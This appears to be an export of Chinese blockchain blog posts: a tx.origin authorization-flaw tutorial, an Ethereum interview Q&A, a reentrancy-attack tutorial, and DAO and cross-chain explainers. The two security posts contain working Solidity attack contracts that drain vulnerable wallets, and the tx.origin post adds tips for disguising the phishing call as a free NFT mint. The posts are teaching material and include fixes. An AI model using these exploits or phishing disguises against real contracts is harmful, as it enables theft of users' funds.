[{"categories":["基础知识","合约安全"],"content":"0x00 前言 在合约代码中，最常用的是使用 msg.sender 来检查授权，但有时由于有些程序员不熟悉 tx.origin 和 msg.sender 的区别，如果使用了 tx.origin 可能导致合约的安全问题。黑客最典型的攻击场景是利用 tx.origin 的代码问题常与钓鱼攻击相结合的组合拳的方式进行攻击。 tx.origin是 Solidity 中的一个全局变量，它返回发送交易的账户地址。如果授权帐户调用恶意合约，使用变量进行授权可能会使合约容易受到攻击。可以调用通过授权检查的易受攻击的合约，因为tx.origin返回交易的原始发件人，在这种情况下是授权帐户。 通过调用 tx.origin 来检查授权可能会导致合约受到攻击，因为 tx.origin 返回交易的原始发送者，因为攻击的调用链可能是 原始发送者－\u003e攻击合约－\u003e 受攻击合约 。在受攻击合约中，tx.origin 是原始发送者。 0x01 前置知识 两者都是 Solidity 中的一个全局变量。 msg.sender: 指直接调用智能合约功能的帐户或智能合约的地址 tx.origin: 指调用智能合约功能的账户地址，只有账户地址可以是tx.origin EOA 账户和合约账户 EOA 账户和合约账户 以太坊账户分两种，外部账户(EOA)和合约账户(SCA)。 外部账户由一对公私钥进行管理，账户包含着 Ether 的余额。 合约账户除了可以含有 Ether 余额外，还拥有一段特定的代码，预先设定代码逻辑在外部账户或其他合约对其合约地址发送消息或发生交易时被调用和处理。 外部账户 EOA 由公私钥对控制 拥有 ether 余额 可以发送交易（transactions） 不包含相关执行代码 合约账户 拥有 ether 余额 含有执行代码 代码仅在该合约地址发生交易或者收到其他合约发送的信息时才会被执行 拥有自己的独立存储状态，且可以调用其他合约 msg.sender 和 tx.origin 的区别 tx.origin：表示最初的调用者，通常取得的是 EOA 的地址。 msg.sender：表示最近的调用者，通常取得是的上级调用者的地址，可以是 EOA 地址，也可以是合约地址。 如果 EOA 用户 A 调用合约 B，合约 B 调用合约 C。那么 在 C 合约中，msg.sender 就是 B 合约的地址，tx.origin 为 A 地址。 在 B 合约中，msg.sender 是 A 地址，tx.origin 也为 A 地址。 通过判断tx.origin==msg.sender来确定调用者是合约还是 EOA 账户。 思考 ：可不可以通过判断一个账户的是否包含执行代码来区分这个账户是 EOA 还是 SCA? 不可以。因为一个合约地址的 CODESIZE是大于零的，但当地址的 CODESIZE等于零时，并不能保证其为非合约，因为合约在构造阶段 CODESIZE也为零。 漏洞演示 下面的漏洞合约代码，在 transfer 方法中做了检查，本意是只有 owner 可以进行 transfer 操作。在这里使用的是tx.origin==owner进行检查。我们假设该 Wallet 合约的部署者是 Alice. contract Wallet { address public owner; constructor() payable { owner = msg.sender; } function transfer(address payable _to, uint _amount) public { require(tx.origin == owner, \"Not owner\"); (bool sent, ) = _to.call{value: _amount}(\"\"); require(sent, \"Failed to send Ether\"); } } 黑客(假设 Eve 为黑客)可以这样进行漏洞利用。 黑客编写一个 Attack 的合约，并进行部署。 黑客通过钓鱼等手段诱导 Wallet 合约的部署者调用 Attack 合约的 attack 方法。 黑客就窃取到了 Wallet 合约的 ETH。 Attack 合约代码 contract Attack { address payable public owner; Wallet wallet; constructor(Wallet _wallet) { wallet = Wallet(_wallet); owner = payable(msg.sender); } function attack() public { wallet.transfer(owner, address(wallet).balance); } } 在这个过程中，Alice 调用了 Attack 合约的 attack 方法，attack 方法调用了 wallet 合约的 transfer 方法，在 transfer 方法中 tx.origin 是 alice(在 transfer 方法中 tx.sender 是 attack 合约)，因为 alice 就是 Wallet 合约的 owner，因此通过检测，将 ETH 转给了黑客 Eve。 还有个疑问，Alice 会傻到去调用 Eve 的合约吗？ 这依靠黑客 Eve 的钓鱼的手法，如果像上面的 attack 方法 Alice 一般不会上当，但如果方法名假装成免费 mint NFT 的函数 freemint，且代码里调用了其它的大量的正常代码，并且调用了其他的合约 C，在 C 合约里调用 wallet.transfer，可能就很难识别出该方法有问题了。而且 Alice 在正常生活中使用 DAPP 时(如使用 uniswap,stepn 等时)，后端采用的也是调用合约方法的形式，相比于直接发送虚假链接发送钓鱼邮件类的邮件，Alice 对此类钓鱼的警惕性会更低些。 所以，黑客为了钓鱼更易成功，可以从下面方面进行增强 多个合约连接。合约 A 调用合约 B，合约 B 调用合约 C，合约 C 调用合约 D，…………，最后合约中调用 wallet.transfer。 黑客的合约可以利用社会工程学伪装，利用贪便宜的心理，打低价或者免费 mint 的旗号，或者高息诱惑的方式等。 黑客可以将漏洞利用隐藏在receive函数中，通过诱导用户向指定的合约转账内触发漏洞利用。如假装与用户进行换币，给客户很大的折扣诱导等。 安全建议 建议使用 msg.sender 进行授权，而非不安全的 tx.origin ，使用不当将会造成不必要的损失。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.4; contract MyContract { address owner; constructor() { owner = msg.sender; } function sendTo(address payable receiver, uint amount) public { // 不安全写法：require(tx.origin == owner); require(msg.sender == owner); receiver.transfer(amount); } } 参考 Tips SWC-115 Authorization through tx.origin https://swcregistry.io/docs/SWC-115 使用 tx-origin 钓鱼 https://solidity-by-example.org/hacks/phishing-with-tx-origin 代码中的 tx.origin==msg.sender 有什么作用？ https://ethereum.stackexchange.com/questions/113962/what-does-msg-sender-tx-origin-actually-do-why https://davidkathoh.medium.com/tx-origin-vs-msg-sender-93db7f234cb9 ","date":"2019-10-01","objectID":"/blog/20191001/unsafe-problems-caused-by-tx-origin-authorization-in-smart-contracts.html/:0:0","tags":["基础知识","合约安全","EXP","POC"],"title":"智能合约中通过 tx.origin 授权引发的不安全问题","uri":"/blog/20191001/unsafe-problems-caused-by-tx-origin-authorization-in-smart-contracts.html/"},{"categories":["基础知识"],"content":"1 以太坊常见问题 在以太坊中，Wei和Ether(以太币)有什么区别？ 答： Wei是以太币的最小面值，就好比说人民币的最小面值是分，英镑的最小面值是便士。 其换算关系为 1 ether = 10^18 wei。 以太坊的平均区块间隔时间是多少？ 答： 平均区块间隔时间为14秒，当然了这只是理论值，你可以在Etherscan（ https://etherscan.io/chart/blocktime ）中查到每日的平均区块时间间隔。 以太坊的平均区块大小是多少？ 答： 区块大小视情况而定，大约是 2KB 。不同于比特币使用区块大小来规定区块的交易量上限，以太坊使用燃料（gas）限制。燃料限制决定了每个区块中处理的交易量、存储/带宽的上限，因为交易和智能合约中函数的执行都要根据指令的复杂度多少来付出相应的燃料，所以使用燃料限制来约束区块大小是可行的。 燃料限制会随网络的波动和矿工的意愿变化，每个矿工都可以选择自己愿意接受的燃料价格。燃料价格就像是比特币中的交易费，只是这里的价格是最小单位燃料的价格，而不是每笔交易的价格。 想要算出一个区块中可以容纳多少笔交易，你不需要清楚地知道燃料的价格，只需知道平均每笔交易使用多少燃料并用整个燃料限制除以它即可。 去年以太猫的发行造成了以太坊网络的大拥堵，整个网络中充斥着大量未被处理的交易。在这种情况下矿工有两种选择。他们可以投票提高燃料限制来处理更多交易，也可以开始提高自己的燃料价格标准并拒绝处理燃料费用过低的交易。 与比特币一样，即使燃料价格很低的交易也可能会被处理加入区块链中，但矿工肯定会先处理完燃料价格高的交易再处理它。如果你的交易并没有那么紧急，设置一个很低的燃料价格也不是不可以，就像我们现实生活中的“花时间来节省金钱”。 如果有恶意用户持续地发起海量交易堵塞网络，全网的交易成本就会越来越高，直到这个恶意用户用完资金或者矿工赚足了交易费并决定扩大网络容量。 以太币是如何产生的？ 答： 2014年以太坊项目以众筹的形式创建并预售了6000万个以太币，除此之外，矿工挖矿也会生成新的以太币。 以太坊中的节点是什么？ 答： 从本质上来说，节点是一台连接到区块链、可以处理交易的计算机。 以太坊都有哪些网络？ 答： 以太坊共有三种类型的网络： 以太坊主链 （就是我们平时用的以太坊）、 以太坊测试网络 （如早期的 Ropsten 和 Rinkeby，最新的 Goerli 和 Sepolia 供开发人员的学习和测试）和 以太坊私有链 （也叫以太坊私有网络，任何人都能用以太坊的代码部署自己的私有链）。 与以太坊网络交互都哪些方法？ 答： 区块链节点、web3.js+智能合约、ethers.js+智能合约、remix+智能合约、ethscan+智能合约、Ethreum JSON RPC API + 智能合约。 你是否能在以太坊中“隐藏”一笔交易？ 答： 不能。以太坊区块链中所有的交易都是公开可见的。 以太坊的交易记录存放在哪里？ 答： 在公共可见的账本中，这个帐本通常被称为区块链。可以通过区块链浏览器进行查询。 以太坊主链已经很强大了，为什么还要使用以太坊私有链？ 答： 原因有很多，主要是因为数据涉及隐私，将数据库去中心化，权限控制和测试。 如何查看一笔交易或一个区块的详细信息？ 答： 你可以使用区块链浏览器，如etherscan.io或live.ether.camp。 如何查看私有链中一笔交易或一个区块的详细信息？ 答： 一些开源的区块链浏览器满足这种需求，如etherparty推出的区块链浏览器（ https://github.com/etherparty/explorer ）。 区块链的共识过程是什么？ 答： 共识是按照特定的协议（如以太坊的协议）验证交易，将交易打包进区块并加入区块链的过程。 以太坊挖矿操作的工作原理是什么呢？ 答： 从原理上说，以太坊中的挖矿操作几乎与比特币相同。 简单地说，就是对于每个包含交易的区块，矿工使用计算机反复且非常快速地试验谜题的答案，直到有一个矿工猜对谜题。 更具体地说，矿工将当前区块唯一的区块头元数据（包括时间戳和软件版本）和一个随机数（nonce value）作为哈希函数的输入，函数将返回一个固定长度、看起来像是由数字和字母随机组成的乱码，叫做哈希值。哈希函数的特性是不同输入对应不同的哈希值，因此矿工仅需改变随机数的值，就会得到一个完全不同的哈希值。 如果算出来的哈希值小于当前的目标值（挖矿难度），则这个矿工就挖出了一个区块，他会获得一些以太币奖励，然后通过向全网络广播该区块，其他节点可以验证该区块中的交易，验证通过后将该区块加入到本地区块链的副本中。也就是说，如果矿工B算出了一个哈希值，矿工A将立刻停止当前区块的哈希值计算，把B挖出的区块加入区块链中并开始新一轮的哈希值计算。 矿工们很难在这场算力竞争中作弊。为了得到迷题的答案，除了一个个试没有更好的办法，也没有伪造这些计算工作的可能，这就是该解谜方法被称为“工作量证明”的原因。 从另一方面来说，用户不需要来验证哈希值是否正确，因为每个节点都已验证过。 一般来说，每12到15秒就会有一个矿工挖出一个新区块。如果矿工解谜的时间开始出现更快或更慢的倾向，算法会自动调整问题的难度，以使矿工解谜的时间稳定在14秒左右。 矿工有一定几率能挖到新区块赚取以太币奖励，他们的赚钱能力取决于运气和他们投入的计算能力。 以太坊使用的工作量证明算法被称为“ethash”，它被设计的需要更多内存，从而增大了使用昂贵的ASIC矿机挖矿的难度，因为ASIC矿机的出现严重压榨了使用其他设备矿工的收益，以至于在比特币中唯一能盈利的挖矿形式就是使用这种定制化的芯片。 从某种意义上来说，ethash可能已经成功实现了这一目标，因为专用的ASIC矿机不能用于挖掘以太坊（至少目前还没有）。 此外，由于以太坊将要从工作量证明挖矿逐步过渡到权益证明挖矿，因而购买ASIC矿机可能不是一个明智的选择，因为一旦以太坊转向权益证明它必将被淘汰。 区块链中最常用的两种共识协议是什么？ 答： 工作量证明（PoW）和权益证明(PoS)，业界也在不断涌现其它新的共识协议。 签署一笔交易需要用到什么工具？ 答： 用户的私钥。 在私钥丢失后，用户是否还可以恢复以太坊帐户？ 答： 是的，用户可以使用12字助记词恢复。 用什么方法可以连接到以太坊节点？ 答： IPC-RPC，JSON-RPC和WS-RPC（RPC指Remote Procedure Call，远程过程调用）。 2 以太坊客户端相关 以太坊中异常火爆的Geth是什么呢？ 答： Geth是以太坊的一个命令行客户端。 连接到Geth客户端的默认方式是什么？ 答： 默认情况下使用IPC-RPC，禁用其他所有的RPC。 Geth客户端中都有哪些API（Application Programming Interface，应用程序编程接口）？ 答： Admin（管理员）、 eth（以太币）、web3、miner（矿工）、net（网络）、personal（个人）、shh、debug（调试）和 txpool（工具）。 你可以使用哪些RPC通过网络连接到Geth客户端？ 答： 你可以使用JSON-RPC或WS-RPC通过网络连接到Geth客户端。 IPC-RPC只能用来连接本地部署的Geth客户端。 如果你输入命令“--rpc”，启用的是哪一个RPC？ 答： JSON-RPC。 默认情况下哪些RPC API是启用的？ 答： eth（以太币）、 web3和net（网络）。 如何为JSON-RPC启用admin api？ 答： 输入命令“–rpcapi”。 命令“--datadir”有什么功能？ 答： 它指定了区块链的存储位置。 Geth的“快速”同步是什么，为什么它更快速呢？ 答： “快速”同步仅下载收款交易所在的区块，并拉取（pull）整个最近状态数据库，而不是像普通同步一样，下载整个区块链的数据并重放所有发生的交易。 命令“--testnet”有什么功能？ 答： 它将客户端连接到以太坊测试网络。 启动Geth客户端会在屏幕上打印大量的输出信息，如果不想被这些繁杂信息干扰该怎么办？ 答： 使用“–verbosity”命令调低输出信息复杂度的值（默认值为3）。 如何使用IPC-RPC连接两个Geth客户端？ 答： 首先启动一个Geth客户端，复制其管道位置（pipe location），然后使用相同的数据文档存储目录（datadir）启动另一个Geth客户端，并使用”–attach”命令传递复制的管道位置。 如何将自定义javascript文件加载到Geth控制台？ 答：输入”–preload”命令和文件的路径即可。 Geth客户端中帐户存储在哪里？ 答：存储在密钥库（keystore）目录中。 如何使用给定的账户发起一笔交易？ 答：首先你要在“ –unlock ”命令中传入帐户地址或索引来解锁账户。然后你需要使用“–password ”命令指定一个此账户的密码文件。 我们刚才说到了有关索引的内容。账户的索引取决于什么？ 答：取决于你添加帐户的顺序。 Geth客户端是否能用来挖矿？ 答：是的，输入“–mine”命令即可。 挖矿选项中的“etherbase”是什么？ 答：这是接受挖矿奖励的帐户地址，该帐户的索引为0。 3 智能合约常见问题 ABI是什么？ 答：简单来说，“ABI”就是低级别的“API”。 ABI（Application Binary Interface）应用程序二进制接口，从本质上讲就是你调用智能合约中的函数并获取它返回值的方式。 ABI","date":"2022-12-20","objectID":"/blog/20221220/blockchain-technology-interview-question-and-answer.html/:0:0","tags":["基础知识","面试题"],"title":"区块链技术面试题","uri":"/blog/20221220/blockchain-technology-interview-question-and-answer.html/"},{"categories":["合约安全"],"content":" 引言 它曾导致以太坊分叉为 ETH 和 ETC（以太经典）。 1 什么是重入攻击？ 重入攻击是智能合约中最常见的一种攻击，攻击者通过合约漏洞（例如fallback函数）循环调用合约，将合约中资产转走或铸造大量代币。 一些著名的重入攻击事件： 2016年，The DAO合约被重入攻击，黑客盗走了合约中的 3,600,000 枚 ETH，并导致以太坊分叉为 ETH 链和 ETC（以太经典）链。 2019年，合成资产平台 Synthetix 遭受重入攻击，被盗 3,700,000 枚 sETH。 2020年，借贷平台 Lendf.me 遭受重入攻击，被盗 $25,000,000。 2021年，借贷平台 CREAM FINANCE 遭受重入攻击，被盗 $18,800,000。 2022年，算法稳定币项目 Fei 遭受重入攻击，被盗 $80,000,000。 距离 The DAO 被重入攻击已经多年了，但每年还是会有几次因重入漏洞而损失千万美元的项目，因此理解这个漏洞非常重要。 抢银行的故事 为了让大家更好理解，这里给大家讲一个\"黑客5oneXj抢银行\"的故事。 以太坊银行的柜员都是机器人（Robot），由智能合约控制。当正常用户（User）来银行取钱时，它的服务流程： 查询用户的 ETH 余额，如果大于0，进行下一步。 将用户的 ETH 余额从银行转给用户，并询问用户是否收到。 将用户名下的余额更新为0。 一天黑客 5oneXj 来到了银行，这是他和机器人柜员的对话： 5oneXj : 我要取钱，1 ETH。 Robot: 正在查询您的余额：1 ETH。正在转帐1 ETH到您的账户。您收到钱了吗？ 5oneXj : 等等，我要取钱，1 ETH。 Robot: 正在查询您的余额：1 ETH。正在转帐1 ETH到您的账户。您收到钱了吗？ 5oneXj : 等等，我要取钱，1 ETH。 Robot: 正在查询您的余额：1 ETH。正在转帐1 ETH到您的账户。您收到钱了吗？ 5oneXj : 等等，我要取钱，1 ETH。 … 最后，黑客5oneXj通过重入攻击的漏洞，把银行的资产搬空了，银行卒。 2 漏洞合约复现 ","date":"2021-08-20","objectID":"/blog/20210820/solidity-smart-contract-security-re-entrancy.html/:0:0","tags":["Solidity"],"title":"Solidity智能合约安全：重入攻击","uri":"/blog/20210820/solidity-smart-contract-security-re-entrancy.html/"},{"categories":["合约安全"],"content":"2.1 银行合约 银行合约非常简单，包含1个状态变量 balanceOf 记录所有用户的以太坊余额，以及包含3个函数： deposit()： 存款函数，将ETH存入银行合约，并更新用户的余额。 withdraw()： 提款函数，将调用者的余额转给它。具体步骤和上面故事中一样：查询余额，转账，更新余额。注意：这个函数有重入漏洞！ getBalance()： 获取银行合约里的ETH余额。 contract Bank { mapping (address =\u003e uint256) public balanceOf; // 余额mapping // 存入ether，并更新余额 function deposit() external payable { balanceOf[msg.sender] += msg.value; } // 提取msg.sender的全部ether function withdraw() external { uint256 balance = balanceOf[msg.sender]; // 获取余额 require(balance \u003e 0, \"Insufficient balance\"); // 转账 ether !!! 可能激活恶意合约的fallback/receive函数，有重入风险！ (bool success, ) = msg.sender.call{value: balance}(\"\"); require(success, \"Failed to send Ether\"); // 更新余额 balanceOf[msg.sender] = 0; } // 获取银行合约的余额 function getBalance() external view returns (uint256) { return address(this).balance; } } ","date":"2021-08-20","objectID":"/blog/20210820/solidity-smart-contract-security-re-entrancy.html/:1:0","tags":["Solidity"],"title":"Solidity智能合约安全：重入攻击","uri":"/blog/20210820/solidity-smart-contract-security-re-entrancy.html/"},{"categories":["合约安全"],"content":"2.2 攻击合约 重入攻击的一个攻击点就是合约转账ETH的地方： 转账ETH的目标地址如果是合约，会触发对方合约的fallback（回退）函数，从而造成循环调用的可能。 (bool success, ) = msg.sender.call{value: balance}(\"\"); 假如黑客在攻击合约中的 fallback() 或 receive() 函数中重新调用了Bank合约的 withdraw() 函数，就会造成5oneXj抢银行故事中的循环调用，不断让Bank合约转账给攻击者，最终将合约的ETH提空。 receive() external payable { bank.withdraw(); } 下面我们看下攻击合约，它的逻辑非常简单，就是通过 receive() 回退函数循环调用Bank合约的 withdraw() 函数。它有1个状态变量bank用于记录Bank合约地址，以及包含4个函数： 构造函数: 初始化Bank合约地址。 receive(): 回调函数，在接收ETH时被触发，并再次调用Bank合约的 withdraw() 函数，循环提款。 attack()： 攻击函数，先Bank合约的 deposit() 函数存款，然后调用withdraw()发起第一次提款，之后Bank合约的 withdraw() 函数和攻击合约的receive()函数会循环调用，将Bank合约的ETH提空。 getBalance()： 获取攻击合约里的ETH余额。 contract Attack { Bank public bank; // Bank合约地址 // 初始化Bank合约地址 constructor(Bank _bank) { bank = _bank; } // 回调函数，用于重入攻击Bank合约，反复的调用目标的 withdraw 函数 receive() external payable { if (bank.getBalance() \u003e= 1 ether) { bank.withdraw(); } } // 攻击函数，调用时 msg.value 设为 1 ether function attack() external payable { require(msg.value == 1 ether, \"Require 1 Ether to attack\"); bank.deposit{value: 1 ether}(); bank.withdraw(); } // 获取本合约的余额 function getBalance() external view returns (uint256) { return address(this).balance; } } 3 Remix演示 部署Bank合约，调用deposit()函数，转入20 ETH。 切换到攻击者钱包，部署Attack合约。 调用Atack合约的attack()函数发动攻击，调用时需转账1 ETH。 调用Bank合约的getBalance()函数，发现余额已被提空。 调用Attack合约的getBalance()函数，可以看到余额变为21 ETH，重入攻击成功。 4 预防办法 目前主要有两种办法来预防可能的重入攻击漏洞： 检查-影响-交互模式（checks-effect-interaction）和重入锁。 ","date":"2021-08-20","objectID":"/blog/20210820/solidity-smart-contract-security-re-entrancy.html/:2:0","tags":["Solidity"],"title":"Solidity智能合约安全：重入攻击","uri":"/blog/20210820/solidity-smart-contract-security-re-entrancy.html/"},{"categories":["合约安全"],"content":"4.1 检查-影响-交互模式 检查-影响-交互模式强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。如果我们将Bank合约withdraw()函数中的更新余额提前到转账ETH之前，就可以修复漏洞： function withdraw() external { uint256 balance = balanceOf[msg.sender]; require(balance \u003e 0, \"Insufficient balance\"); // 检查-效果-交互模式（checks-effect-interaction）：先更新余额变化，再发送ETH // 重入攻击的时候，balanceOf[msg.sender]已经被更新为0了，不能通过上面的检查。 balanceOf[msg.sender] = 0; (bool success, ) = msg.sender.call{value: balance}(\"\"); require(success, \"Failed to send Ether\"); } ","date":"2021-08-20","objectID":"/blog/20210820/solidity-smart-contract-security-re-entrancy.html/:3:0","tags":["Solidity"],"title":"Solidity智能合约安全：重入攻击","uri":"/blog/20210820/solidity-smart-contract-security-re-entrancy.html/"},{"categories":["合约安全"],"content":"4.2 重入锁 重入锁是一种防止重入函数的修饰器（modifier），它包含一个默认为0的状态变量_status。被nonReentrant重入锁修饰的函数，在第一次调用时会检查_status是否为0，紧接着将_status的值改为1，调用结束后才会再改为0。这样，当攻击合约在调用结束前第二次的调用就会报错，重入攻击失败。如果你不了解修饰器，可以阅读WTF Solidity极简教程第11讲：修饰器。 uint256 private _status; // 重入锁 // 重入锁 modifier nonReentrant() { // 在第一次调用 nonReentrant 时，_status 将是 0 require(_status == 0, \"ReentrancyGuard: reentrant call\"); // 在此之后对 nonReentrant 的任何调用都将失败 _status = 1; _; // 调用结束，将 _status 恢复为0 _status = 0; } 只需要用nonReentrant重入锁修饰withdraw()函数，就可以预防重入攻击了。 // 用重入锁保护有漏洞的函数 function withdraw() external nonReentrant{ uint256 balance = balanceOf[msg.sender]; require(balance \u003e 0, \"Insufficient balance\"); (bool success, ) = msg.sender.call{value: balance}(\"\"); require(success, \"Failed to send Ether\"); balanceOf[msg.sender] = 0; } 5 总结 这一讲，我们介绍了以太坊最常见的一种攻击——重入攻击，并编了一个5oneXj抢银行的小故事方便大家理解，最后我们介绍了两种预防重入攻击的办法：检查-影响-交互模式（checks-effect-interaction）和重入锁。在例子中，黑客利用了回退函数在目标合约进行ETH转账时进行重入攻击。实际业务中，ERC721和ERC1155的safeTransfer()和safeTransferFrom()安全转账函数，还有ERC777的回退函数，都可能会引发重入攻击。对于新手，我的建议是用重入锁保护所有可能改变合约状态的external函数，虽然可能会消耗更多的gas，但是可以预防更大的损失。 ","date":"2021-08-20","objectID":"/blog/20210820/solidity-smart-contract-security-re-entrancy.html/:4:0","tags":["Solidity"],"title":"Solidity智能合约安全：重入攻击","uri":"/blog/20210820/solidity-smart-contract-security-re-entrancy.html/"},{"categories":["基础知识"],"content":" 引言 没有集中领导的、成员共同拥有的社区。 一种与互联网上的陌生人合作的安全方式。 一个为特定事业投入资金的安全场所。 1 什么是去中心化自治组织？ 去中心化自治组织是指集体所有且由区块链监管的组织，为一个共同的使命而奋斗。 去中心化自治组织让全世界志同道合之士开展合作，而无需信赖一位宅心仁厚的领导来管理资金和运营。 没有可以随意花钱的首席执行官，也没有能够做假账的首席财务官。 取而代之的是，融入代码的基于区块链的规则规定组织如何运作以及资金如何使用。 去中心化自治组织拥有内部资产，未经该组织批准，任何人都无权动用。 决策通过提案和投票监管，确保组织中的每位成员都有发言权，一切都发生在链上，公开透明。 2 我们为什么需要去中心化自治组织？ 与他人创办涉及资金和金钱的组织，需要对与合作对象高度信任。 不过，显然很难相信互联网上素不相识的人。 通过去中心化自治组织，您不需要相信组织中的其他人，只需要相信去中心化自治组织的代码就够了，它是 100% 公开透明的，任何人都可以验证。 这为全球合作和协调提供了许多新机会。 3 去中心化自治组织与传统组织的对比 去中心化自治组织 通常是平等的，并且完全民主。 需要成员投票才能实施任何更改。 不需要可信的中间人就可以自动计算投票、执行结果。 以去中心化方式自动提供服务（例如慈善基金的分配）。 所有活动公开透明。 传统组织 通常等级鲜明。 可能部分人就能进行决策，也可能投票表决，具体取决于组织结构。 如果允许投票，则在内部计票，投票结果必须由人工处理。 需要人工处理或自动集中控制，易受操纵。 活动通常是私密进行，不向公众开放。 4 去中心化自治组织应用 慈善机构 – 可以接受全世界任何人的捐赠，并投票决定要资助的项目。 集体所有权 – 可以购买实体或数字资产，组织成员可以投票决定如何使用它们。 风险投资和赠款 - 您可以成立一个风险基金，汇集投资资本并投票进行商业投资。 后续收益可以分配给相应 DAO 成员。 5 去中心化自治组织如何运作？ 智能合约是去中心化自治组织的基础，它定义了组织的规则并持有组织的资产。 合约在以太坊上生效后，除非表决通过，否则任何人都不能修改规则。 任何人都无法超越合约定义的规则和逻辑行事。 由于资产也由智能合约定义，这也意味着未经组织批准任何人都不能使用资金。 所以去中心化组织也不需要中央权威。 相反，组织集体作出决定，而付款会在表决通过后自动获批。 之所以能够做到这一点，是因为智能合约在以太坊上生效后，就无法被篡改。 一切都是公开的，你不可能在其他人一无所知的情况下修改代码（去中心化组织定义的规则）。 6 去中心化自治组织的治理 ","date":"2020-05-20","objectID":"/blog/20200520/what-is-decentralized-autonomous-organization-dao.html/:0:0","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/blog/20200520/what-is-decentralized-autonomous-organization-dao.html/"},{"categories":["基础知识"],"content":"6.1 委托 委托就像是去中心化自治组织的代议制民主。 代币持有者将投票委托给那些自提名并承诺管理协议和随时了解动态的用户。 案例：以太坊域名服务（ENS）- 以太坊域名服务持有者可以将他们的选票委托给参与的社区成员来代表他们。 ","date":"2020-05-20","objectID":"/blog/20200520/what-is-decentralized-autonomous-organization-dao.html/:1:0","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/blog/20200520/what-is-decentralized-autonomous-organization-dao.html/"},{"categories":["基础知识"],"content":"6.2 自动交易治理 在很多去中心化自治组织中，如果达到法定人数的成员投票赞成，交易将自动执行。 案例：Nouns — 在 Nouns 去中心化自治组织中，只要创始人不否决，如果投票达到法定票数并且多数票赞成，那么交易将自动执行。 ","date":"2020-05-20","objectID":"/blog/20200520/what-is-decentralized-autonomous-organization-dao.html/:2:0","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/blog/20200520/what-is-decentralized-autonomous-organization-dao.html/"},{"categories":["基础知识"],"content":"6.1 多重签名治理 虽然去中心化自治组织可能有数千名有投票权的成员，但资金一般会放在一个由 5 到 20 名活跃社区成员共同管理的钱包中，这些成员受组织信任并接受监督（社区知道他们的公开身份）。 投票后，执行多重签名的签名者将执行社区的意志。 7 去中心化自治组织的成员资格 ","date":"2020-05-20","objectID":"/blog/20200520/what-is-decentralized-autonomous-organization-dao.html/:3:0","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/blog/20200520/what-is-decentralized-autonomous-organization-dao.html/"},{"categories":["基础知识"],"content":"7.1 基于代币的成员资格 通常无需许可，取决于其使用的代币。 通常，这些治理代币在去中心化交易所无需许可即可易， 其余代币要通过提供流动性或“工作量证明”才能赚取。 无论何种方式，只要持有代币就可以参与投票。 案例：MakerDAO — 去中心化交易所普遍提供 MakerDAO 的代币 MKR，任何人都可以买入，从而获得对 Maker 协议未来的投票权。 ","date":"2020-05-20","objectID":"/blog/20200520/what-is-decentralized-autonomous-organization-dao.html/:4:0","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/blog/20200520/what-is-decentralized-autonomous-organization-dao.html/"},{"categories":["基础知识"],"content":"7.2 基于份额的成员资格 基于份额的去中心化自治组织通常拥有更多权限，但仍然相当公开透明。 任何潜在成员都可以提交加入去中心化自治组织的提案，并且通常以代币或工作的形式提供有价值的贡献。 份额代表直接投票权和所有权。 成员可以随时退出组织并带走属于他们的资金份额。 通常用于联系更紧密、以人为中心的组织，例如慈善机构、工人团体和投资俱乐部等。 也可以管理协议和代币。 案例：MolochDAO – MolochDAO 致力于为以太坊项目募集资金。 他们需要成员资格提案，以便组织可以评估您是否具有必要的专业知识和资本来对潜在受资助者做出明智判断。 您无法通过在公开市场上购买代币来加入这类去中心化自治组织。 ","date":"2020-05-20","objectID":"/blog/20200520/what-is-decentralized-autonomous-organization-dao.html/:5:0","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/blog/20200520/what-is-decentralized-autonomous-organization-dao.html/"},{"categories":["基础知识"],"content":"7.3 基于信誉的成员资格 信誉代表参加投票的证明，并授予去中心化自治组织中的投票权。 不同于基于代币或份额的成员资格，基于信誉的去中心化自治组织不会将所有权转让给贡献者。 信誉积分不能够购买、转让或委托；去中心化自治组织成员必须通过参与获得信誉积分。 链上投票无需许可，潜在成员可以自由提交加入去中心化自治组织的提案，并要求获得信誉积分和代币，作为他们所做贡献的奖励。 通常用于协议和去中心化应用程序的去中心化开发和管理，但同时非常适合各类组织，例如慈善机构、工人团体、投资俱乐部等。 案例：DXdao – DXdao 是一个全球性的主权团体，自 2019 年以来一直致力于构建和管理去中心化协议和应用。 该组织利用基于信誉积分的治理和全息共识来协调和管理资金，这意味着任何人都不能对它的未来施加影响。 ","date":"2020-05-20","objectID":"/blog/20200520/what-is-decentralized-autonomous-organization-dao.html/:6:0","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/blog/20200520/what-is-decentralized-autonomous-organization-dao.html/"},{"categories":["基础知识"],"content":"1 跨链概念 跨链是通过连接相对独立的区块链系统，实现资产、数据等的跨链互操作，跨链的主要实现形式包括跨链资产互换和跨链资产转移。 跨链技术 2013年之前，区块链的发展主要集中在单一区块链。2013年以来，跨链技术蓬勃发展，跨链的几种主要模式相继被提出。发展到现在，包含公证人机制、侧链/中继、哈希锁定、分布式私钥控制这四种主流的跨链技术。 实现跨链的两个关键问题分别是跨链交易的原子性和跨链交易验证。哈希锁定模式利用哈希锁和时间锁能够保证跨链交易的原子性，即只有满足一定的时间条件和哈希条件交易才能够完成，从而实现跨链资产互换。对于相互独立的两条区块链而言，为实现跨链资产转移，不得不依赖于外部第三方进行信息交互，根据第三方的工作范围可以分为公证人机制和中继模式。在公证人机制下，第三方负责数据收集和交易验证；在中继模式下，第三方仅负责数据收集，交易验证由目标链完成。 总体而言，跨链技术在过去几年间得到了迅速发展，相关的项目层出不穷。现有的跨链相关项目中，基于侧链/中继模式的项目占比最高；基于哈希锁定的闪电网络自主网上线以来节点数量、通道数量和网络容量不断增长，技术可行性得到了较好的验证；通信协议簇（通过规定一系列通信数据格式与协议规范等实现区块链接入）类项目未来能否成为主流跨链方案一定程度上取决于业界对于相关标准规范的接受度。但是目前跨链技术尚未完全成熟和广泛应用,仍有较大的提升空间。此外除了跨链本身的技术形态演进，跨链技术未来的发展也与跨链技术的应用模式密切相关。 2 跨链代表 